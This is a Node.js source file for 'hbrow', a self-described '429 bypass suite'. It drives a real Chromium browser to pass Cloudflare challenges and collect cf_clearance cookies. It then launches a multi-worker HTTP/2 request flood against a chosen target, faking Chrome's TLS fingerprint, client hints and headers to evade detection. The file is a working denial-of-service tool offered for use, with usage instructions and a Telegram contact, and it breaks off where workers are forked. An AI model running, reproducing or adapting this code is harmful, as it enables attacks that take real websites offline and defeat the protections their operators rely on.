const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const nodePath = require("path");
const { execFileSync } = require("child_process");
const EventEmitter = require('events');

EventEmitter.defaultMaxListeners = 0;

const MAX_CONCURRENT_STREAMS_PER_WORKER = 150;

// ── Chrome profile ───────────────────────────────────────────────────────────
// The flood reuses the browser that solved the challenge, so its version comes
// from that browser's own User-Agent. This constant is only the fallback for
// when no session was obtained; nothing else in this file pins a version.
const CHROME_FALLBACK_MAJOR = 158;

const GREASE_CHARS = [' ', '(', ':', '-', '.', '/', ')', ';', '=', '?', '_'];
const GREASE_VERSIONS = ['8', '99', '24'];

// Chrome 152+ leads the group list with the post-quantum hybrid. An OpenSSL
// without ML-KEM rejects the name outright, so the list is probed instead of
// assumed, and the older Chrome trio is the fallback.
const CHROME_CURVES = (() => {
    for (const curve of ['X25519MLKEM768:X25519:P-256:P-384', 'X25519:P-256:P-384']) {
        try {
            tls.createSecureContext({ ecdhCurve: curve });
            return curve;
        } catch {
            // coba kandidat berikutnya
        }
    }
    return 'X25519';
})();

// Chromium derives the decoy brand name, its version and the order of all three
// brands from the major version. A hardcoded decoy is what goes stale the moment
// Chrome ships, and it is the first thing a checker cross-checks against the UA.
// Order index: 0 Chromium, 1 Google Chrome, 2 decoy. Indexed by major % 6.
const BRAND_ORDER = [[2, 0, 1], [2, 1, 0], [0, 2, 1], [1, 2, 0], [0, 1, 2], [1, 0, 2]];

function chromeBrands(major) {
    const decoy = 'Not' + GREASE_CHARS[major % 11] + 'A' + GREASE_CHARS[(major + 1) % 11] + 'Brand';
    const branded = [
        ['Chromium', String(major)],
        ['Google Chrome', String(major)],
        [decoy, GREASE_VERSIONS[major % 3]]
    ];

    return BRAND_ORDER[major % 6].map((index) => branded[index]);
}

function brandHeader(brands, fullVersion) {
    return brands.map(([brand, version]) =>
        '"' + brand + '";v="' + (fullVersion && brand.startsWith('Not') ? version + '.0.0.0' : fullVersion || version) + '"'
    ).join(', ');
}

function fallbackUserAgent() {
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        + '(KHTML, like Gecko) Chrome/' + CHROME_FALLBACK_MAJOR + '.0.0.0 Safari/537.36';
}

// ── Chrome TLS fingerprint (cipher set and order match Chrome, verified by
//    capturing this build's ClientHello) ──────────────────────────────────────
const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384",
    "AES128-SHA",
    "AES256-SHA"
].join(":");

// ── Chrome signature algorithms, in Chrome's order. Measured on this build:
//    the option does reach the wire (8 entries), so keep it in sync. ──────────
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");

// ── console design ───────────────────────────────────────────────────────────
// Same house style as the rapidreset banner: one gradient wordmark carries
// identity, every label sits on the same 11-column gutter, numbers are right
// aligned so the live panel does not jitter as the counters climb. The bar and
// the credit line stay inside the glyphs every Windows codepage still maps.
const NAME = 'hbrow';
const VERSION = '1.0';
const BUILD = '2026.11';
const CREDIT = '@fasthttps';
const CONTACT = 't.me/fasthttps';

const colorEnabled = Boolean(process.stdout.isTTY) && !process.env.NO_COLOR;

// COLORFGBG is "fg;bg"; a light background needs the deeper pair so the gradient
// still clears WCAG AA instead of washing out. Unset means we assume a dark one.
function detectedLightBackground() {
    const bg = Number((process.env.COLORFGBG || '').split(';').pop());
    return Number.isInteger(bg) && bg >= 7;
}

const lightBg = detectedLightBackground();

const bannerPalette = lightBg
    ? { from: '#0f766e', to: '#6d28d9', muted: '#475569' }
    : { from: '#5eead4', to: '#a78bfa', muted: '#94a3b8' };

const ANSI_RESET = colorEnabled ? '\x1b[0m' : '';

function hexToRgb(hex) {
    const value = parseInt(hex.slice(1), 16);
    return [value >> 16 & 0xff, value >> 8 & 0xff, value & 0xff];
}

function lerpColor(from, to, t) {
    return from.map((channel, i) => Math.round(channel + (to[i] - channel) * t));
}

// An explicit grey rather than the terminal's dim attribute, so the contrast
// ratio is a known number instead of whatever the theme makes of "dim".
function muted(text) {
    if (!colorEnabled) return text;
    const [r, g, b] = hexToRgb(bannerPalette.muted);
    return `\x1b[38;2;${r};${g};${b}m${text}${ANSI_RESET}`;
}

function gradient(text, fromHex, toHex) {
    if (!colorEnabled) return text;

    const chars = [...text];
    const from = hexToRgb(fromHex);
    const to = hexToRgb(toHex);
    const width = chars.filter((char) => char !== ' ').length;
    let step = 0;

    return chars.map((char) => {
        if (char === ' ') return char;
        const [r, g, b] = lerpColor(from, to, width > 1 ? step++ / (width - 1) : 0);
        return `\x1b[38;2;${r};${g};${b}m${char}`;
    }).join('') + ANSI_RESET;
}

// Log levels stay on the 8-colour set so the terminal's own theme keeps them
// readable on either background; truecolour is reserved for identity.
const LEVEL_COLOR = { info: 36, ok: 32, warn: 33, err: 31 };

function tag(level) {
    const open = colorEnabled ? '\x1b[' + LEVEL_COLOR[level] + 'm' : '';
    return open + '[' + NAME + ']' + ANSI_RESET;
}

function logLine(level, message) {
    console.log('  ' + tag(level) + ' ' + message);
}

function wordmark(meta) {
    const logo = gradient(NAME + ' ' + VERSION, bannerPalette.from, bannerPalette.to);
    return '  ' + logo + (meta ? '  ' + muted(meta) : '');
}

function creditLine() {
    return '  ' + muted(CREDIT + '  ·  ' + CONTACT);
}

function bannerRow(label, value) {
    return '  ' + muted(label.padEnd(11)) + value;
}

function bannerCount(label, value) {
    return '  ' + muted(label.padEnd(11)) + String(value).padStart(8);
}

function plural(count, noun) {
    return count + ' ' + noun + (count === 1 ? '' : 's');
}

function progressBar(fraction) {
    const width = 20;
    const filled = Math.max(0, Math.min(width, Math.round(width * fraction)));
    return '█'.repeat(filled) + '─'.repeat(width - filled);
}

const META = '· 429 bypass suite · browser-assisted · build ' + BUILD;

function printBanner(browser) {
    console.log([
        '',
        wordmark(META),
        creditLine(),
        '',
        bannerRow('target', TARGET.href),
        bannerRow('mode', 'cf_clearance harvest -> http/2 flood'),
        bannerRow('browser', browser || 'auto-detect'),
        bannerRow('workers', args.threads),
        bannerRow('sessions', args.cookieCount),
        bannerRow('started', new Date().toLocaleString('en-GB')),
        ''
    ].join('\n'));
}

function printUsage() {
    console.log([
        '',
        wordmark(META),
        creditLine(),
        '',
        bannerRow('usage', 'node browser.js <target> <time> <rate> <threads> <cookieCount>'),
        bannerRow('example', 'node browser.js https://target.com 60 64 4 2'),
        '',
        bannerRow('target', 'host or url, scheme optional'),
        bannerRow('time', 'run length in seconds'),
        bannerRow('rate', 'requests per burst, per worker'),
        bannerRow('threads', 'worker processes'),
        bannerRow('cookies', 'cf_clearance sessions to harvest, default 2'),
        ''
    ].join('\n'));
}

if (process.argv.length < 6) {
    printUsage();
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2
};

let currentRate = args.Rate;
let consecutive429 = 0;

// Operators paste targets bare half the time; a missing scheme would otherwise
// make the URL constructor throw before a single stream opens.
function parseTarget(target) {
    const withScheme = /^[a-z][a-z0-9+.-]*:\/\//i.test(target) ? target : "https://" + target;
    const parsed = new URL(withScheme);

    return {
        href: parsed.href,
        host: parsed.host,
        hostname: parsed.hostname,
        protocol: parsed.protocol,
        path: parsed.pathname + parsed.search
    };
}

const TARGET = parseTarget(args.target);

// ── Data pools ────────────────────────────────────────────────────────────────
const LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.8,fr;q=0.7",
    "en-US,en;q=0.9,de;q=0.8",
    "en-GB,en;q=0.8"
];

// ── Main flood function (HTTP/2 with Chrome-matching TLS fingerprint) ─────────
function flood(userAgent, cookie) {
    try {
        const host = TARGET.hostname;
        const path = TARGET.path;

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function getChromeVersion(ua) {
            const m = ua.match(/Chrome\/([\d.]+)/);
            return m ? m[1] : CHROME_FALLBACK_MAJOR + ".0.0.0";
        }

        const chromever = getChromeVersion(userAgent);
        const chromeVersion = chromever.split('.')[0];
        const randValue = list => list[Math.floor(Math.random() * list.length)];

        // Whatever the bypass browser reported about itself wins over the
        // version-derived guess — an Edge or Brave session would otherwise carry
        // Chrome brand strings next to its own User-Agent and fail the cross-check.
        const hints = global.clientHints || null;

        const referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
            "https://yandex.com/",
            TARGET.href,
            "https://duckduckgo.com/?q=" + encodeURIComponent(host)
        ];

        // Build per-request headers with randomization
        function buildHeaders() {
            // sec-fetch-site is a function of the referer, so drawing the two
            // independently is what puts "none" next to a Google referer, or
            // "cross-site" next to the target's own URL, inside one request.
            const referer = Math.random() < 0.25 ? null : randValue(referers);
            const fetchSite = !referer
                ? "none"
                : referer.startsWith("https://" + host) ? "same-origin" : "cross-site";
            // Chrome sends cache-control on a reload, not on a fresh navigation,
            // and it dropped pragma from navigations entirely.
            const reload = Math.random() < 0.25;

            const headers = {
                ":method": "GET",
                ":authority": TARGET.host,
                ":scheme": "https",
                ":path": path,
                ...(reload ? { "cache-control": "max-age=0" } : {}),
                "sec-ch-ua": browserBrandsFromHints(hints, "brands", () => brandHeader(chromeBrands(Number(chromeVersion)))),
                "sec-ch-ua-mobile": hints && hints.mobile ? "?1" : "?0",
                "sec-ch-ua-platform": "\"" + ((hints && hints.platform) || "Windows") + "\"",
                "sec-ch-ua-platform-version": "\"" + ((hints && hints.platformVersion) || "15.0.0") + "\"",
                "sec-ch-ua-model": "\"" + ((hints && hints.model) || "") + "\"",
                "sec-ch-ua-arch": "\"" + ((hints && hints.architecture) || "x86") + "\"",
                "sec-ch-ua-bitness": "\"" + ((hints && hints.bitness) || "64") + "\"",
                "sec-ch-ua-full-version-list": browserBrandsFromHints(hints, "fullVersionList",
                    () => brandHeader(chromeBrands(Number(chromeVersion)), global.chromeFullVersion || chromever)),
                "upgrade-insecure-requests": "1",
                "user-agent": userAgent,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "sec-fetch-site": fetchSite,
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                ...(referer ? { "referer": referer } : {}),
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": randValue(LANGS),
                "priority": "u=0, i",
                "te": "trailers"
            };
            if (cookie) headers["cookie"] = cookie;
            return headers;
        }

        // ── TLS socket with Chrome-matching fingerprint ───────────────────────
        const tlsSocket = tls.connect({
            host: host,
            port: 443,
            servername: host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            // h3 is a QUIC ALPN; a TCP ClientHello never offers it. Chrome sends
            // exactly these two.
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            // Chrome 152+ leads with the post-quantum hybrid group.
            ecdhCurve: CHROME_CURVES,
            secureOptions:
                crypto.constants.SSL_OP_NO_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1,
            rejectUnauthorized: false
        });

        tlsSocket.on("error", () => {
            global.failedRequests = (global.failedRequests || 0) + 1;
            global.totalRequests = (global.totalRequests || 0) + 1;
            if (!tlsSocket.destroyed) tlsSocket.destroy();
            setTimeout(() => flood(userAgent, cookie), randomDelay(500, 1500));
        });

        // ── HTTP/2 session over TLS socket ────────────────────────────────────
        const client = http2.connect(TARGET.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                maxConcurrentStreams: 1000,
                maxFrameSize: 16384,
                maxHeaderListSize: 262144
            }
        });

        client.on("connect", () => {
            function sendRequests() {
                if (client.destroyed || client.closed) return;

                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(buildHeaders());

                    request.on("response", (res) => {
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;

                        const status = res[":status"];
                        if (status === 429 || status === 503) {
                            consecutive429++;
                            client.close();
                        }
                    });

                    request.on("error", () => {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                    });

                    request.end();
                }

                // Human-like random delay between bursts
                setTimeout(sendRequests, randomDelay(500, 2000));
            }
            sendRequests();
        });

        client.on("close", () => {
            if (!client.destroyed) client.destroy();
            setTimeout(() => flood(userAgent, cookie), randomDelay(500, 1500));
        });

        client.on("error", () => {
            global.failedRequests = (global.failedRequests || 0) + 1;
            global.totalRequests = (global.totalRequests || 0) + 1;
            if (!client.destroyed) client.destroy();
            setTimeout(() => flood(userAgent, cookie), randomDelay(500, 1500));
        });

        client.setTimeout(20000, () => {
            if (!client.destroyed) client.destroy();
        });

    } catch (err) {
        setTimeout(() => flood(userAgent, cookie), 1000);
    }
}

// ── Chromium binary discovery ─────────────────────────────────────────────────
// chrome-launcher's own finder walks two exact paths under LOCALAPPDATA,
// PROGRAMFILES and PROGRAMFILES(X86), then gives up with "No Chrome
// installations found.". An Edge-only Windows box, a browser sitting in the
// puppeteer cache, a portable build, or a parent process whose environment lost
// those variables all die there, before the bypass opens a single page. The
// binary is resolved here instead and the absolute path is handed to the
// launcher, which skips its own detection once chromePath is set.
const ENV_CHROME_VARS = [
    'CHROME_PATH',
    'PUPPETEER_EXECUTABLE_PATH',
    'BROWSER_PATH',
    'CHROME_BIN',
    'LIGHTHOUSE_CHROMIUM_PATH'
];

const WINDOWS_INSTALLS = [
    ['Google', 'Chrome', 'Application', 'chrome.exe'],
    ['Google', 'Chrome Beta', 'Application', 'chrome.exe'],
    ['Google', 'Chrome Dev', 'Application', 'chrome.exe'],
    ['Google', 'Chrome SxS', 'Application', 'chrome.exe'],
    ['Chromium', 'Application', 'chrome.exe'],
    ['BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'],
    ['Microsoft', 'Edge', 'Application', 'msedge.exe'],
    ['Microsoft', 'Edge Beta', 'Application', 'msedge.exe'],
    ['Vivaldi', 'Application', 'vivaldi.exe'],
    ['Programs', 'Opera', 'opera.exe'],
    ['Programs', 'Opera GX', 'opera.exe']
];

const WINDOWS_REGISTRY_HIVES = [
    'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\',
    'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\',
    'HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\'
];

const WINDOWS_REGISTRY_KEYS = ['chrome.exe', 'msedge.exe', 'brave.exe', 'vivaldi.exe'];
const WINDOWS_PROBE = ['chrome.exe', 'msedge.exe', 'brave.exe', 'vivaldi.exe', 'opera.exe'];

const POSIX_INSTALLS = [
    '/opt/google/chrome/chrome',
    '/opt/google/chrome/google-chrome',
    '/usr/bin/google-chrome-stable',
    '/usr/bin/google-chrome',
    '/usr/bin/google-chrome-beta',
    '/usr/bin/google-chrome-unstable',
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser',
    '/snap/bin/chromium',
    '/usr/lib/chromium/chromium',
    '/usr/lib/chromium-browser/chromium-browser',
    '/usr/bin/brave-browser',
    '/usr/bin/brave',
    '/usr/bin/microsoft-edge-stable',
    '/usr/bin/microsoft-edge',
    '/usr/bin/vivaldi-stable',
    '/var/lib/flatpak/exports/bin/com.google.Chrome',
    '/var/lib/flatpak/exports/bin/org.chromium.Chromium'
];

const POSIX_PROBE = [
    'google-chrome-stable',
    'google-chrome',
    'chromium',
    'chromium-browser',
    'brave-browser',
    'microsoft-edge-stable',
    'microsoft-edge',
    'vivaldi-stable'
];

const DARWIN_INSTALLS = [
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    '/Applications/Google Chrome Beta.app/Contents/MacOS/Google Chrome Beta',
    '/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary',
    '/Applications/Chromium.app/Contents/MacOS/Chromium',
    '/Applications/Brave Browser.app/Contents/MacOS/Brave Browser',
    '/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge',
    '/Applications/Vivaldi.app/Contents/MacOS/Vivaldi'
];

const DARWIN_HOME_INSTALLS = [
    ['Applications', 'Google Chrome.app', 'Contents', 'MacOS', 'Google Chrome'],
    ['Applications', 'Google Chrome Canary.app', 'Contents', 'MacOS', 'Google Chrome Canary'],
    ['Applications', 'Chromium.app', 'Contents', 'MacOS', 'Chromium'],
    ['Applications', 'Brave Browser.app', 'Contents', 'MacOS', 'Brave Browser'],
    ['Applications', 'Microsoft Edge.app', 'Contents', 'MacOS', 'Microsoft Edge']
];

function isBrowserBinary(candidate) {
    if (!candidate) return false;

    try {
        fs.accessSync(candidate, process.platform === 'win32' ? fs.constants.R_OK : fs.constants.X_OK);
        return fs.statSync(candidate).isFile();
    } catch {
        return false;
    }
}

function firstExisting(candidates) {
    for (const candidate of candidates) {
        if (isBrowserBinary(candidate)) return candidate;
    }

    return null;
}

function windowsInstallCandidates() {
    const roots = [process.env.LOCALAPPDATA, process.env.PROGRAMFILES, process.env['PROGRAMFILES(X86)']].filter(Boolean);
    const candidates = [];

    for (const root of roots) {
        for (const install of WINDOWS_INSTALLS) candidates.push(nodePath.join(root, ...install));
    }

    return candidates;
}

// The per-user OPERA layout sits under LOCALAPPDATA\Programs, not next to the
// machine-wide installs, so it needs its own pass.
function windowsUserInstallCandidates() {
    const local = process.env.LOCALAPPDATA;
    if (!local) return [];

    return WINDOWS_INSTALLS
        .filter((install) => install[0] === 'Programs')
        .map((install) => nodePath.join(local, ...install));
}

// App Paths is what Windows itself uses to resolve a bare "chrome" from the Run
// box, so it survives installs the directory walk cannot guess.
function windowsRegistryCandidates() {
    const found = [];

    for (const exe of WINDOWS_REGISTRY_KEYS) {
        for (const hive of WINDOWS_REGISTRY_HIVES) {
            try {
                const output = execFileSync('reg', ['query', hive + exe, '/ve'], {
                    stdio: ['ignore', 'pipe', 'ignore'],
                    windowsHide: true,
                    encoding: 'utf8'
                });
                const match = output.match(/REG_SZ\s+(.+?)\s*$/m);
                if (match) found.push(match[1].replace(/^"|"$/g, ''));
            } catch {
                // Key absent on this machine.
            }
        }
    }

    return found;
}

function probeCommand(command, names) {
    const found = [];

    for (const name of names) {
        try {
            const output = execFileSync(command, [name], {
                stdio: ['ignore', 'pipe', 'ignore'],
                windowsHide: true,
                encoding: 'utf8'
            });

            for (const line of output.split(/\r?\n/)) {
                const trimmed = line.trim();
                if (trimmed) found.push(trimmed);
            }
        } catch {
            // Not on PATH.
        }
    }

    return found;
}

// Chrome for Testing dropped by puppeteer or rebrowser-puppeteer. Newest version
// directory first, since sort() on the version strings puts 130 above 99.
function cachedBrowserCandidates() {
    const root = process.env.PUPPETEER_CACHE_DIR || nodePath.join(os.homedir(), '.cache', 'puppeteer');
    const chromeRoot = nodePath.join(root, 'chrome');
    let versions = [];

    try {
        versions = fs.readdirSync(chromeRoot).sort().reverse();
    } catch {
        return [];
    }

    const layouts = process.platform === 'win32'
        ? [['chrome-win64', 'chrome.exe'], ['chrome-win32', 'chrome.exe']]
        : process.platform === 'darwin'
            ? [
                ['chrome-mac-arm64', 'Google Chrome for Testing.app', 'Contents', 'MacOS', 'Google Chrome for Testing'],
                ['chrome-mac-x64', 'Google Chrome for Testing.app', 'Contents', 'MacOS', 'Google Chrome for Testing']
            ]
            : [['chrome-linux64', 'chrome'], ['chrome-linux', 'chrome']];

    const found = [];

    for (const version of versions) {
        for (const layout of layouts) found.push(nodePath.join(chromeRoot, version, ...layout));
    }

    return found;
}

// A WSL session has no Linux browser at all when the operator runs the flood
// from inside Windows, which is the normal setup on a Windows box.
function wslWindowsCandidates() {
    const candidates = [];
    const roots = ['/mnt/c/Program Files', '/mnt/c/Program Files (x86)'];

    for (const root of roots) {
        for (const install of WINDOWS_INSTALLS) candidates.push(nodePath.join(root, ...install));
    }

    try {
        for (const user of fs.readdirSync('/mnt/c/Users')) {
            for (const install of WINDOWS_INSTALLS) {
                candidates.push(nodePath.join('/mnt/c/Users', user, 'AppData', 'Local', ...install));
            }
        }
    } catch {
        // C: not mounted.
    }

    return candidates;
}

function findChromeBinary() {
    for (const name of ENV_CHROME_VARS) {
        if (isBrowserBinary(process.env[name])) return process.env[name];
    }

    if (process.platform === 'win32') {
        return firstExisting(windowsInstallCandidates())
            || firstExisting(windowsUserInstallCandidates())
            || firstExisting(windowsRegistryCandidates())
            || firstExisting(probeCommand('where', WINDOWS_PROBE))
            || firstExisting(cachedBrowserCandidates())
            || null;
    }

    if (process.platform === 'darwin') {
        const homeCandidates = DARWIN_HOME_INSTALLS.map((install) => nodePath.join(os.homedir(), ...install));

        return firstExisting(DARWIN_INSTALLS)
            || firstExisting(homeCandidates)
            || firstExisting(cachedBrowserCandidates())
            || null;
    }

    const candidates = POSIX_INSTALLS.slice();

    if (fs.existsSync('/mnt/c/Program Files')) candidates.push(...wslWindowsCandidates());

    return firstExisting(candidates)
        || firstExisting(probeCommand('which', POSIX_PROBE))
        || firstExisting(cachedBrowserCandidates())
        || null;
}

// Memoized: the probe shells out on Windows and every worker forked before the
// bypass would otherwise pay for it.
let chromeBinary;

function chromePath() {
    if (chromeBinary === undefined) chromeBinary = findChromeBinary();
    return chromeBinary;
}

function browserLabel() {
    const binary = chromePath();
    return binary ? nodePath.basename(binary) : 'auto-detect';
}

function profileDir(attemptNum) {
    const dir = nodePath.join(os.tmpdir(), 'cf-bypass', 'run-' + attemptNum + '-' + process.pid + '-' + Date.now());
    fs.mkdirSync(dir, { recursive: true });
    return dir;
}

// The profile is passed as an option, so chrome-launcher will not clean it up
// itself; on Windows the last handles can still be open when the browser close
// resolves, hence the retries.
function removeProfileDir(dir) {
    try {
        fs.rmSync(dir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
    } catch {
        // Profile left behind in the temp directory.
    }
}

function browserBrandsFromHints(hints, list, fallback) {
    if (!hints || !Array.isArray(hints[list]) || hints[list].length === 0) return fallback();

    return hints[list].map((entry) => '"' + entry.brand + '";v="' + entry.version + '"').join(', ');
}

// ── Cloudflare Bypass via Puppeteer ──────────────────────────────────────────
// Loaded on first use: the forked workers never touch a browser, and a missing
// puppeteer stack reads as a one-line instruction instead of a startup crash.
let connectToBrowser;

function loadConnect() {
    if (connectToBrowser === undefined) {
        try {
            connectToBrowser = require("puppeteer-real-browser").connect;
        } catch (err) {
            connectToBrowser = null;
        }
    }

    return connectToBrowser;
}

async function launchBypassBrowser(workspace) {
    return loadConnect()({
        headless: false,
        turnstile: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled',
        ],
        customConfig: {
            chromePath: chromePath() || undefined,
            userDataDir: workspace
        },
        connectOption: { defaultViewport: null },
        disableXvfb: process.platform !== 'linux'
    });
}

async function readClientHints(page) {
    return page.evaluate(async () => {
        const data = navigator.userAgentData;
        if (!data) return null;

        const hints = {
            mobile: !!data.mobile,
            brands: (data.brands || []).map((entry) => ({ brand: entry.brand, version: entry.version }))
        };

        try {
            const high = await data.getHighEntropyValues([
                'fullVersionList', 'platform', 'platformVersion', 'architecture', 'bitness', 'model'
            ]);

            hints.fullVersionList = (high.fullVersionList || []).map((entry) => ({ brand: entry.brand, version: entry.version }));
            hints.platform = high.platform || '';
            hints.platformVersion = high.platformVersion || '';
            hints.architecture = high.architecture || '';
            hints.bitness = high.bitness || '';
            hints.model = high.model || '';
        } catch {
            // High-entropy hints refused; the low-entropy brands still carry the major version.
        }

        return hints;
    });
}

// The challenge widget is a nested iframe and its checkbox only exists once the
// widget has finished painting, so every selector is attempted on every pass
// until the cookie shows up.
async function clickChallengeWidget(page) {
    const frame = page.frames().find((candidate) => candidate.url().includes('cloudflare'));

    if (!frame) return;

    for (const selector of ['.cb-c', '#challenge-stage', 'input[type="checkbox"]', 'body']) {
        const element = await frame.$(selector);
        if (element) {
            await element.click();
            return;
        }
    }
}

async function bypassCloudflareOnce(attemptNum) {
    let browser = null;
    let page = null;
    const workspace = profileDir(attemptNum);

    try {
        logLine('info', 'attempt ' + attemptNum + ' · launching ' + browserLabel());

        const response = await launchBypassBrowser(workspace);

        if (!response || !response.browser) throw new Error("Failed to launch browser");

        browser = response.browser;
        page = response.page;

        logLine('info', 'navigate ' + TARGET.href);
        await page.goto(TARGET.href, { waitUntil: 'domcontentloaded', timeout: 60000 });

        let challengeCompleted = false;
        let checkCount = 0;

        while (!challengeCompleted && checkCount < 60) {
            await new Promise(r => setTimeout(r, 1000));

            try {
                const x = 50 + Math.random() * 500;
                const y = 50 + Math.random() * 500;
                await page.mouse.move(x, y);
            } catch (e) { }

            try {
                await clickChallengeWidget(page);
            } catch (e) { }

            const cookies = await page.cookies();
            const cfClearance = cookies.find(c => c.name === "cf_clearance");
            if (cfClearance) { challengeCompleted = true; break; }
            checkCount++;
        }

        const cookies = await page.cookies();
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        const userAgent = await page.evaluate(() => navigator.userAgent);
        const hints = await readClientHints(page);

        // sec-ch-ua-full-version-list is the one header that has to carry the
        // real build number, and the UA only carries the major version. The
        // harvested hints are the source; the UA token is the net.
        const brandEntry = hints && hints.fullVersionList
            ? hints.fullVersionList.find((entry) => entry.brand === 'Google Chrome' || entry.brand === 'Chromium')
            : null;
        const fullVersion = (brandEntry && brandEntry.version)
            || (userAgent.match(/Chrome\/([\d.]+)/) || [])[1]
            || '';

        if (browser) await browser.close();

        if (cfClearance) {
            logLine('ok', 'clearance acquired · ' + cookies.length + ' cookies · ' + fullVersion);
            return { cookies, userAgent, fullVersion, hints, success: true };
        } else {
            logLine('err', 'no cf_clearance after ' + checkCount + 's');
            return { cookies: [], userAgent, fullVersion, hints, success: false };
        }

    } catch (error) {
        logLine('err', error.message);
        if (browser) { try { await browser.close(); } catch (e) { } }
        return { success: false };
    } finally {
        removeProfileDir(workspace);
    }
}

async function bypassCloudflareParallel(totalCount) {
    const results = [];
    const browser = loadConnect();
    const binary = browser ? chromePath() : null;

    if (!browser) {
        logLine('err', 'puppeteer-real-browser missing · run in ' + __dirname + ':');
        logLine('err', '  npm install puppeteer-real-browser');
    } else if (binary) {
        logLine('info', 'harvesting ' + plural(totalCount, 'session') + ' with ' + nodePath.basename(binary));
    } else {
        logLine('err', 'no chromium-family browser on this machine');
        logLine('warn', 'install chrome, or set CHROME_PATH to chrome.exe / msedge.exe / brave.exe and rerun');
    }

    for (let i = 0; i < totalCount && browser; i++) {
        const res = await bypassCloudflareOnce(i + 1);
        if (res.success) results.push(res);
        if (results.length >= totalCount) break;
    }

    if (results.length === 0) {
        logLine('warn', 'no sessions harvested · using synthesized profile');
        results.push({
            cookies: [],
            userAgent: fallbackUserAgent(),
            hints: null,
            success: true
        });
    }
    return results;
}

function runFlooder() {
    const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
    if (!bypassInfo) return;

    const cookieString = bypassInfo.cookies
        ? bypassInfo.cookies.map(c => c.name + "=" + c.value).join("; ")
        : "";
    const userAgent = bypassInfo.userAgent || fallbackUserAgent();

    global.chromeFullVersion = bypassInfo.fullVersion || "";
    global.clientHints = bypassInfo.hints || null;

    flood(userAgent, cookieString);
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const fraction = args.time > 0 ? Math.min(1, elapsed / args.time) : 1;
    const total = global.totalRequests || 0;
    const proto = TARGET.protocol === 'https:' ? 'HTTP/2 (TLS, ALPN h2)' : 'HTTP/2';

    console.clear();
    console.log([
        '',
        wordmark('· live · ' + plural(args.threads, 'worker')),
        creditLine(),
        '',
        bannerRow('target', TARGET.href),
        bannerRow('protocol', proto),
        bannerRow('elapsed', elapsed + 's / ' + args.time + 's'),
        bannerRow('progress', progressBar(fraction) + '  ' + String(Math.round(fraction * 100)).padStart(3) + '%'),
        bannerRow('rate', currentRate + ' req/burst'),
        bannerRow('browser', browserLabel()),
        '',
        bannerCount('total', total),
        bannerCount('ok', global.successRequests || 0),
        bannerCount('err', global.failedRequests || 0),
        bannerCount('429', consecutive429),
        bannerCount('req/s', elapsed > 0 ? Math.round(total / elapsed) : 0),
        ''
    ].join('\n'));
}

global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.retryCount = 0;
global.startTime = Date.now();
global.bypassData = [];
global.clientHints = null;

if (cluster.isMaster) {
    console.clear();
    printBanner(loadConnect() ? chromePath() : null);

    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        global.bypassData = bypassResults;

        logLine('ok', plural(bypassResults.length, 'session') + ' ready · forking ' + plural(args.threads, 'worker'));
        global.startTime = Date.now();

        for (let i = 0; i < args.threads; i++) {
